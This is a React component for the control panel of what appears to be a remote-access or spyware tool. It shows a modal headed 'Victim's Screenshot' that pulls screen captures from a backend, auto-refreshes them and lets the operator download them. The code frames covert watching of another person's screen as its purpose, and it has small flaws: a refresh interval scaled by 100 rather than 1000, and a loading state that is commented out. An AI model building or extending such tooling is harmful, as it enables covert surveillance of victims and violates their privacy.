import React, { useState, useEffect } from 'react';
import { RefreshCw, Download, X, Monitor } from 'lucide-react';

const ScreenshotViewer = ({ isOpen, onClose, backend_url = 'http://localhost:3001' }) => {
  const [screenshot, setScreenshot] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [refreshInterval, setRefreshInterval] = useState(5);

  const fetchScreenshot = async () => {
    // setLoading(true);
    setError(null);

    try {
      const response = await fetch(`${backend_url}/screenshot`);

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const blob = await response.blob();
      const imageUrl = URL.createObjectURL(blob);
      setScreenshot(imageUrl);

    } catch (err) {
      setError(err.message);
      console.error('Error fetching screenshot:', err);
    } finally {
    //   setLoading(false);
    }
  };

  const downloadScreenshot = () => {
    if (screenshot) {
      const link = document.createElement('a');
      link.href = screenshot;
      link.download = `screenshot-${Date.now()}.png`;
      link.click();
    }
  };

  useEffect(() => {
    if (autoRefresh && isOpen) {
      const interval = setInterval(fetchScreenshot, refreshInterval * 100);
      return () => clearInterval(interval);
    }
  }, [autoRefresh, isOpen]);

  useEffect(() => {
    const handleEscape = (e) => {
      if (e.key === 'Escape' && isOpen) {
        onClose();
      }
    };

    document.addEventListener('keydown', handleEscape);
    return () => document.removeEventListener('keydown', handleEscape);
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/60 backdrop-blur-sm transition-all duration-300"
        onClick={onClose}
      />

      {/* Dialog */}
      <div className="relative w-full max-w-5xl mx-4 max-h-[95vh] bg-black rounded-2xl shadow-2xl border border-white/10 overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between p-6 border-b border-white/10 bg-black/70">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-white/10 rounded-lg">
              <Monitor className="w-5 h-5 text-white" />
            </div>
            <h2 className="text-xl font-semibold text-white">Victim's Screenshot</h2>
          </div>

          <div className="flex items-center gap-3">
            {/* Auto-refresh toggle */}
            <label className="flex items-center gap-2 text-sm text-gray-400 hover:text-white transition-colors">
              <input
                type="checkbox"
                checked={autoRefresh}
                onChange={(e) => setAutoRefresh(e.target.checked)}
                className="w-4 h-4 text-white bg-black border-white/20 rounded focus:ring-white focus:ring-2"
              />
              Auto-refresh
            </label>
            <input
                type="number"
                value={refreshInterval}
                onChange={(e) => setRefreshInterval(Number(e.target.value))}
                min="1"
                className="w-16 p-1 bg-gray-800 border border-gray-700 text-white rounded text-sm text-center focus:outline-none focus:ring-2 focus:ring-blue-500"
            />

            {/* Action buttons */}
            <button
              onClick={fetchScreenshot}
              disabled={loading}
              className="flex items-center gap-2 px-4 py-2 bg-white text-black hover:bg-gray-300 disabled:bg-white/50 rounded-lg transition-colors font-medium"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              Capture
            </button>

            {screenshot && (
              <button
                onClick={downloadScreenshot}
                className="flex items-center gap-2 px-4 py-2 bg-white text-black hover:bg-gray-300 rounded-lg transition-colors font-medium"
              >
                <Download className="w-4 h-4" />
                Download
              </button>
            )}

            {/* Close button */}
            <button
              onClick={onClose}
              className="p-2 text-gray-400 hover:text-white hover:bg-white/10 rounded-lg transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Content */}
        <div className="py-6 max-h-[calc(95vh-100px)] overflow-auto">
          {error && (
            <div className="mb-6 p-4 bg-red-900/40 border border-red-700 text-red-200 rounded-lg">
              <strong className="font-medium">Error:</strong> {error}
            </div>
          )}

          {loading && (
            <div className="flex flex-col items-center justify-center py-16">
              <div className="animate-spin rounded-full h-16 w-16 border-4 border-white/20 border-t-white mb-4"></div>
              <span className="text-gray-300 text-lg">Capturing screenshot...</span>
            </div>
          )}

          {screenshot && !loading && (
            <div className="rounded-xl overflow-hidden bg-black shadow-lg">
              <img
                src={screenshot}
                alt="Remote Screenshot"
                className="w-full h-auto max-h-[calc(95vh-200px)] border border-white/10 object-contain"
                onError={() => setError('Failed to load screenshot image')}
              />
            </div>
          )}

          {!screenshot && !loading && !error && (
            <div className="text-center py-16">
              <Monitor className="w-16 h-16 text-white/20 mx-auto mb-4" />
              <p className="text-gray-500 text-lg mb-2">No screenshot captured yet</p>
              <p className="text-gray-600">Click "Capture" to take a screenshot</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ScreenshotViewer;
